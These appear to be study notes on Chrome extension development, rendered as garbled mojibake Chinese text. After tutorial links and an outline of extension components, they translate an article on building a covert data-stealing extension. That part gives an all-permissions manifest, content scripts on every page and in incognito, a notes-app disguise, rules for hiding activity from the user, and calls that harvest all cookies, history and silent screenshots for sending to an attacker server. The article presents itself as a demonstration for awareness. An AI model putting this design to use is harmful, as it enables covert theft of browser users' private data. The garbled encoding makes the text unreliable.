# Chrome æ’ä»¶å¼€å‘å…¥é—¨

Chrome æ’ä»¶å¼€å‘æ–‡æ¡£ï¼š[developer.chrome.com](https://developer.chrome.com/extensions)

ChromeAppHeroesï¼š[zhaoolee/ChromeAppHeroes: ğŸŒˆè°·ç²’-Chromeæ’ä»¶è‹±é›„æ¦œ, ä¸ºä¼˜ç§€çš„Chromeæ’ä»¶å†™ä¸€æœ¬ä¸­æ–‡è¯´æ˜ä¹¦, è®©Chromeæ’ä»¶è‹±é›„ä»¬é€ ç¦äººç±»~ ChromePluginHeroes, Write a Chinese manual for the excellent Chrome plugin, let the Chrome plugin heroes benefit the human~ å…¬ä¼—å·ã€Œ0åŠ 1ã€åŒæ­¥æ›´æ–° (github.com)](https://github.com/zhaoolee/ChromeAppHeroes)

æ–‡ç« ï¼š[Chromeæ’ä»¶è‹±é›„æ¦œ (zhaoolee.com)](https://zhaoolee.com/ChromeAppHeroes/#/)

## å¼€å‘æ¡†æ¶

### extension.js - å¼€ç®±å³ç”¨ã€è·¨æµè§ˆå™¨çš„æ‰©å±•å¼€å‘æ¡†æ¶

å†…ç½®å¯¹TypeScriptã€WebAssemblyã€Reactå’Œç°ä»£ JavaScript çš„æ”¯æŒã€‚

GitHubï¼šhttps://github.com/cezaraugusto/extension.js

å®˜ç½‘æ–‡æ¡£ï¼šhttps://extension.js.org/

## æ–‡ç« 

[å†™htmlé¡µé¢æ²¡æ„æ€ï¼Œæ¥æŒ‘æˆ˜chromeæ’ä»¶å¼€å‘ (qq.com)](https://mp.weixin.qq.com/s/QUgT5bGRutstyo0l6nHFfg)

[å¼€å‘ chrome æ’ä»¶å®ç°çˆ¬è™« - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6951366925557432356)

[chrome æ’ä»¶ DIY - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844903508966113287)

[ä»é›¶æ·±å…¥ Chrome æ’ä»¶å¼€å‘ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7035782439590952968)

[ğŸŒ• æ‰‹æŠŠæ‰‹ä» 0 æ’¸ä¸€ä¸ª Chrome æ’ä»¶ï¼Œã€Šç‰¹åˆ«å…³æ³¨-æ˜é‡‘ã€‹ åŠŸèƒ½ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7124085369926074399)

[å­—èŠ‚è·³åŠ¨ chrome æ’ä»¶å¼€å‘æŒ‡å— - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7114959554709815326)

[é£ä¹¦ chrome æ’ä»¶å¼€å‘æŒ‡å— - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6970912734086955045)

[ä»é›¶æ·±å…¥ Chrome æ’ä»¶å¼€å‘ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7035782439590952968)

[ã€ç¨‹åºå‘˜çš„æµªæ¼«ã€‘ä¸ƒå¤•åˆ°äº†ï¼Œè¿˜ä¸å¿«ç»™ä½ å¥³æœ‹å‹åšä¸€ä¸ªä¸“å± chrome æ’ä»¶ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7122332008252080142)

[30 åˆ†é’Ÿå¼€å‘ä¸€æ¬¾æŠ“å–ç½‘ç«™å›¾ç‰‡èµ„æºçš„æµè§ˆå™¨æ’ä»¶ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844904119828742152)

[Chrome æ’ä»¶å¼€å‘æ•™ç¨‹ä¹‹å…¥é—¨æŒ‡å— (360doc.com)](http://www.360doc.com/content/22/0913/16/11604731_1047745325.shtml)

[Chrome æ’ä»¶å¼€å‘å…¥é—¨\_è°·æ­Œæ’ä»¶å¼€å‘\_CShadow7 çš„åšå®¢-CSDN åšå®¢](https://blog.csdn.net/CShadow7/article/details/123730422)

[10 åˆ†é’Ÿæ•™ä½ å¼€å‘è‡ªå·±çš„ Chrome æµè§ˆå™¨æ’ä»¶ - ç å†œæ•™ç¨‹ (manongjc.com)](http://www.manongjc.com/detail/51-uzjfsulporgmlpm.html)

[chrome æ’ä»¶å¼€å‘æŒ‡å— - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7114959554709815326)

[ä»é›¶æ·±å…¥Chromeæ’ä»¶å¼€å‘ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7035782439590952968)

[chromeæ’ä»¶ä¹‹è„šæœ¬æ³¨å…¥ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7278982293707014155)

[chromeæ’ä»¶ä¹‹tabs - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7254861776839360573)

[Chromeæ’ä»¶(æ‰©å±•ç¨‹åº)å…¨é¢å…¥å‘æŒ‡å—(é™„60ç¯‡åŸåˆ›æ–‡ç« é“¾æ¥) - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844903924055408654)

[ğŸŒ•æ‰‹æŠŠæ‰‹ä»0æ’¸ä¸€ä¸ª Chrome æ’ä»¶ï¼Œã€Šç‰¹åˆ«å…³æ³¨-æ˜é‡‘ã€‹ åŠŸèƒ½ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7124085369926074399)

è§†é¢‘è¯¾ç¨‹ï¼š[chrome æµè§ˆå™¨æ’ä»¶å¼€å‘è§†é¢‘æ•™ç¨‹\_å“”å“©å“”å“©\_bilibili](https://www.bilibili.com/video/av763262694/?vd_source=5f0c99b3deddffe219938763769b15ac)



[ä¸€ä¸ªä»˜è´¹ chrome æ’ä»¶çš„ä¸€ç”Ÿ (t9t.io)](https://blog.t9t.io/star-history-2021-01-21/)

## ç›¸å…³ç½‘ç«™



## å¼€å‘å…¥é—¨

---

æ–‡ç« å‚è€ƒï¼š[Chrome æ’ä»¶å¼€å‘å…¥é—¨ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7167562121768042532)

[é›¶åŸºç¡€ä¹Ÿèƒ½å­¦ä¼šï¼å¿«é€Ÿåˆ¶ä½œä¸€ä¸ªå®ç”¨çš„Chromeæ‹“å±•æ’ä»¶ï¼ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7280747044246716451)

Chrome çš„ç•Œé¢å¸ƒå±€å’Œæ’ä»¶å¼è®¾è®¡å†³å®šäº†å…¶å¯èƒ½çš„æ‰©å±•ç‚¹å’Œæœºåˆ¶ã€‚

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f52ab9ecdab94925afa971af29eaa085~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

### åˆ›å»ºé¡¹ç›®æ ¹ç›®å½•

åœ¨æ‚¨çš„å·¥ä½œç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶å¤¹ï¼Œå‘½åä¸º`my-chrome-extension`ï¼Œå¹¶åœ¨å…¶ä¸­åˆ›å»ºä»¥ä¸‹æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼š

- `manifest.json`ï¼šæ’ä»¶æ¸…å•æ–‡ä»¶ï¼Œç”¨äºå®šä¹‰æ’ä»¶çš„åŸºæœ¬ä¿¡æ¯å’Œæƒé™ã€‚
- `index.html`ï¼šå¼¹å‡ºå¼é¡µé¢çš„HTMLæ–‡ä»¶
- `index.js`ï¼šå¼¹å‡ºå¼é¡µé¢çš„JavaScriptæ–‡ä»¶
- `icon.png`ï¼šæ’ä»¶å›¾æ ‡
- å¾…å®šï¼š`qrcode.js`ï¼šä¸€ä¸ªåœ¨æµè§ˆå™¨ç”ŸæˆäºŒç»´ç çš„åº“ï¼š[cdn.bootcdn.net/ajax/libs/qrcodejs/1.0.0/qrcode.min.js](https://cdn.bootcdn.net/ajax/libs/qrcodejs/1.0.0/qrcode.min.js) æ‰“å¼€å¤åˆ¶åˆ°qrcode.jsæ–‡ä»¶å³å¯

### Manifest.json:é…ç½®å…¥å£

ç”¨ä»¥é…ç½®åº”ç”¨åã€ç‰ˆæœ¬ï¼Œä»¥åŠæ‰€éœ€çš„ç³»ç»Ÿæƒé™ï¼Œæœ€é‡è¦ã€ä¸å¯ç¼ºå°‘ï¼Œå¿…é¡»ç½®äºæ ¹ç›®å½•

- **manifest_version**: æ’ä»¶ç‰ˆæœ¬

ç›®å‰åªæ”¯æŒä¸Šæ¶å’Œæ›´æ–° v3 ç‰ˆæœ¬ï¼Œv2 ä¸å†æ”¯æŒï¼Œå¿…é¡»åœ¨ 2023 å¹´å‰å…¨éƒ¨æ›¿æ¢ã€‚ä¸” V3 ç‰ˆçš„ä¸Šæ¶å®¡æ ¸ä¼˜å…ˆçº§æ›´é«˜ï¼Œå‘¨æœŸæ›´çŸ­ã€‚

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ea2a4521cd5945e2bad90b1b9a7fdf2b~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

v3 ç‰ˆæœ¬å¯¹ v2 ç‰ˆçš„ç»„ä»¶å’Œ API è¿›è¡Œäº†å¤§å¹…åº¦çš„ä¼˜åŒ–å’Œå®‰å…¨å¢å¼ºï¼Œæœ€ä¸»è¦çš„å˜åŠ¨å¦‚ä¸‹å›¾

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/94768f5f685b48ad99986ffaf792b937~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

- **Permission æƒé™**

éœ€è¦ç”³è¯·æ­£ç¡®çš„æƒé™æ‰å¯ä»¥è°ƒç”¨ç›¸åº”çš„ APIï¼Œå¦‚æ“ä½œé€‰é¡¹å¡çš„ tabs æƒé™ã€‚

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/afa9411b69f34e73a4da941dfcc45c64~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

**æœ€å°æƒé™åŸåˆ™**ï¼šå°½é‡ä½¿ç”¨å¿…è¦çš„æƒé™ï¼Œè¿‡å¤šçš„ã€æ•æ„Ÿæƒé™å°†å¯¼è‡´å®¡æ ¸æ—¶é—´å¤§å¤§å»¶é•¿ï¼Œç”šè‡³æ‹’ç»

![componets permission.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/59d2312c7d734cb392363b7972f3ea8f~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?)

v3 ç‰ˆæœ¬ä¸­ Api Permission å’Œ Host Permission åˆ†ç¦»ï¼Œä»¥æ›´æ¸…æ™°çš„ç•Œå®šæƒé™ç±»åˆ«ã€‚

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0906b261e33e4a6995468964e0ee438f~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

### Service Worker: ä¸­å¤®å¤„ç†å™¨

æœ¬è´¨ä¸Šæ˜¯æµè§ˆå™¨åœ¨åå°è¿è¡Œçš„è„šæœ¬ï¼Œå®ƒæ˜¯å®Œå…¨ç‹¬ç«‹äºå®ƒæ­£åœ¨å¤„ç†æˆ–æœåŠ¡çš„ç½‘é¡µã€‚å®ƒä»¬å……å½“äº† web åº”ç”¨ç¨‹åºã€æµè§ˆå™¨å’Œç½‘ç»œä¹‹é—´çš„ä»£ç†æœåŠ¡å™¨ã€‚service worker èµ‹äºˆ Web åº”ç”¨ç¨‹åºåƒåŸç”Ÿåº”ç”¨ç¨‹åºä¸€æ ·å·¥ä½œçš„èƒ½åŠ›

- **æ— çŠ¶æ€ç¬æ—¶ç»„ä»¶**ï¼šåœ¨æµè§ˆå™¨å¯åŠ¨ååˆå§‹åŒ–æ‰§è¡Œï¼Œä¾¿é”€æ¯
- **äº‹ä»¶é©±åŠ¨**ï¼š é€šè¿‡æ³¨å†Œå„ç±»äº‹ä»¶ç›‘å¬å™¨ï¼Œä½œä¸ºå…¶ä»–ç»„ä»¶é—´çš„ä¸­å¤®å¤„ç†å’Œé€šä¿¡å•å…ƒ
- **æƒé™æœ€å¤§ï¼š** å¯ä»¥è°ƒç”¨é™¤äº† Dom å¤–çš„å¤§éƒ¨åˆ† APIï¼Œå®Œæˆå…¶ä»–ç»„ä»¶ä¸å¯ç”¨æ‰§è¡Œçš„åŠŸèƒ½

![img](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a1ffcece9caf46fe968e31f76f43caa5~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?)

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b970805cbea84279802d72e9d7cd5dd3~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

### Popup: å¼¹çª—

ç‚¹å‡» browser*action æˆ–è€… page*action å›¾æ ‡æ—¶æ‰“å¼€çš„ä¸€ä¸ªå°çª—å£ç½‘é¡µï¼Œç„¦ç‚¹ç¦»å¼€ç½‘é¡µå°±ç«‹å³å…³é—­ï¼Œä¸€èˆ¬ç”¨æ¥åšä¸€äº›ä¸´æ—¶æ€§çš„äº¤äº’ã€‚

- å¤§éƒ¨åˆ†æ’ä»¶ä¸»è¦çš„äº¤äº’åŒºåŸŸã€å·¥ä½œæ–¹å¼
- **æœ€å¤§ç©ºé—´**ï¼š800 x 600

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/08d6919f04d5480aa00f713a4709ee0f~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

### ContentJs: å†…å®¹è„šæœ¬

å‘å½“å‰ä¸»é¡µé¢çª—å£ä¸­æ³¨å…¥è„šæœ¬çš„ä¸€ç§å½¢å¼ï¼Œæœ€å¸¸è§çš„æ¯”å¦‚ï¼šå¹¿å‘Šå±è”½ã€é¡µé¢ CSS å®šåˆ¶ã€‚

- çªç ´ POP çª—å£å¤§å°çš„å±€é™æ€§ï¼Œè‡ªç”±åº¦æ›´é«˜
- æ³¨æ„ CSS æ ·å¼æ±¡æŸ“ï¼Œä¼šå¯¼è‡´éƒ¨åˆ†å®¿ä¸»é¡µé¢å˜å½¢

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/29e1d46f65ca433e89e2de3d378e04e6~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

## æ’ä»¶ DIY - Rename Tab

**èƒŒæ™¯**:

éƒ¨åˆ†ç½‘ç«™çš„æ‰€æœ‰å­é¡µé¢çš„æ ‡é¢˜ç›¸åŒï¼Œå½“æ‰“å¼€ä¼—å¤šæ—¶ï¼Œå¾ˆéš¾é€šè¿‡æ ‡é¢˜å¿«é€ŸåŒºåˆ†å…·ä½“æ˜¯å“ªä¸ªé¡µé¢ï¼Œå½±å“å¹¶å‘å¤šå¼€åŸºæ•°ã€‚

**åŠŸèƒ½éœ€æ±‚**:

æ”¯æŒæ‰‹åŠ¨æˆ–è‡ªåŠ¨ä¿®æ”¹å½“å‰é¡µé¢ Tab æ ‡é¢˜ï¼Œå¢åŠ  Tab å¯è¾¨è¯†æ€§ã€å¯æœç´¢æ€§ã€‚

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6c0a60552b2646579f6f8e3d62e9c476~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1933994b05444c91b4a2cea6861f06e1~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp)

### é“¾æ¥

- [Rename Tab](https://gitee.com/coderkkx/chrome-crx-demo)

# æ„å»ºä¸€ä¸ªçªƒå–ä¸€åˆ‡çš„ Chrome æ‰©å±•ç¨‹åº

è¿™ä»¶ä½œå“åœ¨NBTV YouTubeé¢‘é“ä¸Šæ’­å‡ºï¼š[HOW Browser Extensions Steal Your Data (youtube.com)](https://www.youtube.com/watch?v=cIGESSm39n4)

Manifest v3 å¯èƒ½å·²ç»ä»æµè§ˆå™¨æ‰©å±•ä¸­æŠ½èµ°äº†ä¸€äº›æ±æ¶²ï¼Œä½†æˆ‘è®¤ä¸ºæ²¹ç®±é‡Œè¿˜æœ‰å¾ˆå¤šä¸œè¥¿ã€‚ä¸ºäº†è¯æ˜è¿™ä¸€ç‚¹ï¼Œè®©æˆ‘ä»¬æ„å»ºä¸€ä¸ª Chrome æ‰©å±•ç¨‹åºï¼Œå°½å¯èƒ½å¤šåœ°çªƒå–æ•°æ®ã€‚æˆ‘è¯´çš„æ˜¯å¨æˆ¿æ°´æ§½ã€æ•´ä¸ªç‰ç±³é¥¼é¦…ç‰ç±³é¥¼é¦…ã€æ ¼æ—å¥‡æ å¤º Whoville çº§åˆ«çš„æ•°æ®ç›—çªƒã€‚

è¿™å°†å®Œæˆä¸¤ä»¶äº‹ï¼š

- æ¢ç´¢ Chrome æ‰©å±•ç¨‹åºçš„ä¼˜åŠ¿
- æ¼”ç¤ºå¦‚æœæ‚¨ä¸å°å¿ƒå®‰è£…çš„å†…å®¹ï¼Œæ‚¨å°†æ¥è§¦åˆ°ä»€ä¹ˆ

*å…è´£å£°æ˜ï¼šå®é™…å®æ–½è¿™å°†æ˜¯é‚ªæ¶çš„ã€‚ä¸åº”æ»¥ç”¨æ‰©å±•ç¨‹åºæƒé™ã€çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ„å»ºæ¶æ„æµè§ˆå™¨æ‰©å±•ç¨‹åºã€‚æœªç»ç¾å›½èŒä¸šæ£’çƒå¤§è”ç›Ÿæ˜ç¡®ä¹¦é¢åŒæ„ï¼Œä¸å»ºè®®å¯¹è¿™äº›æŠ€æœ¯è¿›è¡Œä»»ä½•å®æ–½ã€è¡ç”Ÿæ‰©å±•æˆ–ä½¿ç”¨ã€‚*

## åŸºæœ¬è§„åˆ™

- ç”¨æˆ·ä¸åº”æ„è¯†åˆ°å¹•åæ­£åœ¨å‘ç”Ÿä»»ä½•äº‹æƒ…ã€‚
- ä¸å¾—æœ‰ä»»ä½•è§†è§‰è¿¹è±¡è¡¨æ˜æœ‰ä»»ä½•ä¸å¯¹åŠ²ã€‚
  - æ²¡æœ‰é¢å¤–çš„æ§åˆ¶å°æ¶ˆæ¯ã€è­¦å‘Šæˆ–é”™è¯¯ã€‚
  - æ²¡æœ‰å…¶ä»–æµè§ˆå™¨è­¦å‘Šæˆ–æƒé™å¯¹è¯æ¡†ã€‚
  - æ²¡æœ‰é¢å¤–çš„é¡µé¢çº§ç½‘ç»œæµé‡ã€‚
- ä¸€æ—¦ç”¨æˆ·åŒæ„**å’³å’³**å……è¶³çš„æƒé™è­¦å‘Šï¼Œè¿™æ˜¯ä»–ä»¬æœ€åä¸€æ¬¡åº”è¯¥è€ƒè™‘æ‰©å±•çš„æƒé™ã€‚

## Chromeæ‰©å±•ç¨‹åºé€Ÿæˆç­

å¦‚æœæ‚¨ä¸ç†Ÿæ‚‰æµè§ˆå™¨æ‰©å±•çš„å†…éƒ¨ç»“æ„ï¼Œé‚£ä¹ˆå¯¹äºæˆ‘ä»¬çš„é‚ªæ¶æ‰©å±•ï¼Œæˆ‘ä»¬å…³å¿ƒä¸‰ä¸ªç»„ä»¶ï¼š

**åå°æœåŠ¡è¾…åŠ©è§’è‰²**

- äº‹ä»¶é©±åŠ¨ã€‚å¯ç”¨ä½œè¿è¡Œ JavaScript çš„â€œæŒä¹…â€å®¹å™¨
- å¯ä»¥è®¿é—®æ‰€æœ‰*çš„ WebExtensions API
- æ— æ³•è®¿é—® DOM API
- æ— æ³•ç›´æ¥è®¿é—®é¡µé¢

**å¼¹å‡ºé¡µé¢**

- ä»…åœ¨ç”¨æˆ·äº¤äº’åæ‰“å¼€
- å¯ä»¥è®¿é—®æ‰€æœ‰*çš„ WebExtensions API
- å¯ä»¥è®¿é—® DOM API
- æ— æ³•ç›´æ¥è®¿é—®é¡µé¢

**å†…å®¹è„šæœ¬**

- å¯ä»¥ç›´æ¥å’Œå®Œå…¨è®¿é—®æ‰€æœ‰é¡µé¢å’Œ DOM
- å¯ä»¥åœ¨é¡µé¢ä¸­è¿è¡Œ JavaScriptï¼Œä½†åœ¨æ²™ç›’è¿è¡Œæ—¶
- åªèƒ½ä½¿ç”¨ WebExtensions API çš„å­é›†
- å—ä¸é¡µé¢ç›¸åŒçš„é™åˆ¶ï¼ˆCORS ç­‰ï¼‰

æœ‰è½»å¾®é™åˆ¶ï¼Œä¸åŒ…æ‹¬ç”µæ± 

## è·å–å…¨å±€æƒé™

åªæ˜¯ä¸ºäº†å¥½ç©ï¼Œæˆ‘ä»¬çš„æ¶æ„æ‰©å±•å°†è¯·æ±‚*æ‰€æœ‰*å¯èƒ½çš„æƒé™ã€‚ https://developer.chrome.com/docs/extensions/mv3/declare_permissions/ æœ‰ä¸€ä¸ª Chrome æ‰©å±•ç¨‹åºæƒé™åˆ—è¡¨ï¼Œæˆ‘ä»¬å°†æ¥å—å¾ˆå¤šã€‚

åœ¨åˆ é™¤ Chrome ä¸æ”¯æŒçš„æ‰€æœ‰æƒé™åï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š

```json
{
  ...
  "host_permissions": ["<all_urls>"],
  "permissions": [
    "activeTab",
    "alarms",
    "background",
    "bookmarks",
    "browsingData",
    "clipboardRead",
    "clipboardWrite",
    "contentSettings",
    "contextMenus",
    "cookies",
    "debugger",
    "declarativeContent",
    "declarativeNetRequest",
    "declarativeNetRequestWithHostAccess",
    "declarativeNetRequestFeedback",
    "desktopCapture",
    "downloads",
    "fontSettings",
    "gcm",
    "geolocation",
    "history",
    "identity",
    "idle",
    "management",
    "nativeMessaging",
    "notifications",
    "pageCapture",
    "power",
    "printerProvider",
    "privacy",
    "proxy",
    "scripting",
    "search",
    "sessions",
    "storage",
    "system.cpu",
    "system.display",
    "system.memory",
    "system.storage",
    "tabCapture",
    "tabGroups",
    "tabs",
    "tabs",
    "topSites",
    "tts",
    "ttsEngine",
    "unlimitedStorage",
    "webNavigation",
    "webRequest"
  ],
}
```

manifest.json

è¿™äº›æƒé™ä¸­çš„å¤§å¤šæ•°éƒ½ä¸éœ€è¦ï¼Œä½†è°åœ¨ä¹å‘¢ï¼Ÿè®©æˆ‘ä»¬çœ‹çœ‹è­¦å‘Šæ¶ˆæ¯æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼š

![img](./Chromeæ’ä»¶å¼€å‘å…¥é—¨.assets/8f0e4276-498c-4d46-80fb-466437307695_2184x1426.png)



Chrome ä¼šæ»šåŠ¨æƒé™è­¦å‘Šæ¶ˆæ¯å®¹å™¨ï¼Œå› æ­¤è¶…è¿‡ä¸€åŠçš„è­¦å‘Šæ¶ˆæ¯ç”šè‡³ä¸ä¼šæ˜¾ç¤ºã€‚æˆ‘æ•¢æ‰“èµŒï¼Œå¤§å¤šæ•°ç”¨æˆ·ä¸ä¼šä¸‰æ€è€Œåè¡Œï¼Œå®‰è£…ä¸€ä¸ªä¼¼ä¹åªè¦æ±‚ 5 ä¸ªæƒé™çš„æ‰©å±•ç¨‹åºã€‚

**å®Œæ•´çš„**æƒé™è­¦å‘Šåˆ—è¡¨å¦‚ä¸‹ï¼š

- é¦–å±ï¼š
  - è®¿é—®é¡µé¢è°ƒè¯•å™¨åç«¯
  - è¯»å–å’Œæ›´æ”¹æ‚¨åœ¨ç½‘ç«™ä¸Šçš„æ‰€æœ‰æ•°æ®
  - æ£€æµ‹æ‚¨çš„å®é™…ä½ç½®
  - è¯»å–å’Œæ›´æ”¹æ‰€æœ‰å·²ç™»å½•è®¾å¤‡ä¸Šçš„æµè§ˆå†å²è®°å½•
  - æ˜¾ç¤ºé€šçŸ¥
- é¦–å±ä¸‹æ–¹ï¼š
  - é˜…è¯»å’Œæ›´æ”¹ä¹¦ç­¾
  - è¯»å–å’Œä¿®æ”¹å¤åˆ¶å’Œç²˜è´´çš„æ•°æ®
  - æ•è·å±å¹•å†…å®¹
  - ç®¡ç†ä¸‹è½½å†…å®¹
  - è¯†åˆ«å’Œå¼¹å‡ºå­˜å‚¨è®¾å¤‡
  - æ›´æ”¹ç½‘ç«™è®¿é—®cookieï¼ŒJavaScriptï¼Œæ’ä»¶ï¼Œåœ°ç†ä½ç½®ï¼Œéº¦å…‹é£ï¼Œç›¸æœºç­‰åŠŸèƒ½çš„è®¾ç½®ã€‚
  - ç®¡ç†åº”ç”¨ã€æ‰©å±•ç¨‹åºå’Œä¸»é¢˜èƒŒæ™¯
  - ä¸åˆä½œçš„æœ¬æœºåº”ç”¨ç¨‹åºé€šä¿¡
  - æ›´æ”¹ä¸éšç§ç›¸å…³çš„è®¾ç½®
  - æŸ¥çœ‹å’Œç®¡ç†æ ‡ç­¾é¡µç»„
  - ä½¿ç”¨å£è¯­åˆæˆè¯­éŸ³é˜…è¯»æ‰€æœ‰æ–‡æœ¬

è®©æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªåœ¨æ‰€æœ‰é¡µé¢å’Œæ¡†æ¶ä¸­è¿è¡Œçš„å†…å®¹è„šæœ¬ï¼Œå°†æ‰©å±•çš„è¦†ç›–èŒƒå›´æ‰©å±•åˆ°éšèº«çª—å£ï¼Œå¹¶ä½¿æ‰€æœ‰èµ„æºéƒ½å¯ä»¥è®¿é—®ï¼Œä»¥å¤‡ä¸æ—¶ä¹‹éœ€ï¼š

```json
{
  ...
  "web_accessible_resources": [
    {
      "resources": ["*"],
      "matches": ["<all_urls>"]
    }
  ],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "all_frames": true,
      "css": [],
      "js": ["content-script.js"],
      "run_at": "document_end"
    }
  ],
  "incognito": "spanning",
}
```

manifest.json

## æ‰©å»ºç«‹é¢

æˆ‘ä»¬ä»¤äººå‘æŒ‡çš„æ‰©å±•å°†ä¼ªè£…æˆä¸€ä¸ªç¬”è®°åº”ç”¨ç¨‹åºï¼š

![img](./Chromeæ’ä»¶å¼€å‘å…¥é—¨.assets/79b66d53-5aec-4c0a-91d0-8ae3fcba5753_1702x922.png)



è¿™ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå°†ç»å¸¸æ‰“å¼€çš„æ‰©å±•é¡µé¢ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿé™é»˜åœ°æ‰§è¡Œæ¶æ„æ•°æ®æ”¶é›†ã€‚æˆ‘ä»¬è¿˜å°†ä½¿ç”¨åå°æœåŠ¡è¾…åŠ©è§’è‰²ã€‚

## åˆ†æå’Œæ•°æ®æ³„éœ²

ç”Ÿå‘½çŸ­æš‚ï¼Œäº’è”ç½‘é€Ÿåº¦å¿«ï¼Œå­˜å‚¨ä¾¿å®œã€‚æˆ‘ä»¬çš„æ‰©å±•å†³å®šæ”¶é›†çš„ä»»ä½•æ•°æ®éƒ½å¯ä»¥å‘é€åˆ°æˆ‘ä»¬é€šè¿‡åå°æœåŠ¡å·¥ä½œè€…æ§åˆ¶çš„æœåŠ¡å™¨ï¼Œç”¨æˆ·å°†ä¸ä¼šæ›´èªæ˜ã€‚åªæœ‰å½“ä»–ä»¬å†³å®šæ£€æŸ¥æ‰©å±•æœ¬èº«çš„ç½‘ç»œæ´»åŠ¨æ—¶ï¼Œè¿™äº›ç½‘ç»œè¯·æ±‚æ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™å¾ˆéš¾åˆ°è¾¾ã€‚

æƒ³è¦åœ¨ç½‘é¡µä¸Šæ·»åŠ ä¾µå…¥æ€§ç”¨æˆ·è·Ÿè¸ªå—ï¼Ÿæ²¡å…³ç³»ï¼æ¥è‡ªåå°é¡µé¢çš„ç½‘ç»œæµé‡ä¸å—å¹¿å‘Šæ‹¦æˆªå™¨æˆ–å…¶ä»–ç”¨æˆ·éšç§æ‰©å±•ç¨‹åºçš„çº¦æŸï¼Œå› æ­¤å¯ä»¥è·Ÿè¸ªæ¯ä¸€æ¬¡ç‚¹å‡»å’Œå‡»é”®ï¼Œè®©æ‚¨æ»¡æ„ã€‚ï¼ˆå¤–éƒ¨ç½‘ç»œæµé‡ç®¡ç†å™¨å’Œ PiHole ä¹‹ç±»çš„ä¸œè¥¿ä»ç„¶å¯ä»¥å·¥ä½œï¼‰

## å”¾æ‰‹å¯å¾—çš„æœå®

ä»ä¸€å¼€å§‹ï¼ŒWebExtensions API å°±è®©æˆ‘ä»¬å‡ ä¹ä¸è´¹å¹ç°ä¹‹åŠ›åœ°æ”¶é›†äº†ç›¸å½“å¤šçš„ä¿¡æ¯ã€‚

### é¥¼å¹²

å°†æµè§ˆå™¨çš„æ‰€æœ‰ cookie æ£€ç´¢ä¸ºæ•°ç»„ã€‚

```js
chrome.cookies.getAll({})
```

### å†å²

ä»¥æ•°ç»„çš„å½¢å¼æ£€ç´¢ç”¨æˆ·çš„æ•´ä¸ªæµè§ˆå†å²è®°å½•ã€‚

```js
chrome.history.search({ text: "" })
```

### æˆªå›¾

é™é»˜æ•è·ç”¨æˆ·å½“å‰æ­£åœ¨æŸ¥çœ‹çš„ä»»ä½•å†…å®¹çš„å±å¹•æˆªå›¾ã€‚æˆ‘ä»¬å¯ä»¥éšå¿ƒæ‰€æ¬²åœ°è°ƒç”¨ä»å†…å®¹è„šæœ¬å‘é€çš„æ¶ˆæ¯ - ç”šè‡³æ›´é¢‘ç¹åœ°è°ƒç”¨æˆ‘ä»¬è®¤ä¸ºæœ‰ä»·å€¼çš„ URLã€‚API å°†å›¾åƒä½œä¸ºæ¼‚äº®çš„æ•°æ® URL å­—ç¬¦ä¸²è¿”å›ï¼Œå› æ­¤å°†å®ƒä»¬å‘é€åˆ°æˆ‘ä»¬çš„æ•°æ®æ”¶é›†ç»ˆç»“ç‚¹æ˜¯å¾®ä¸è¶³é“çš„ã€‚

```js
chrome.tabs.captureVisibleTab()
```

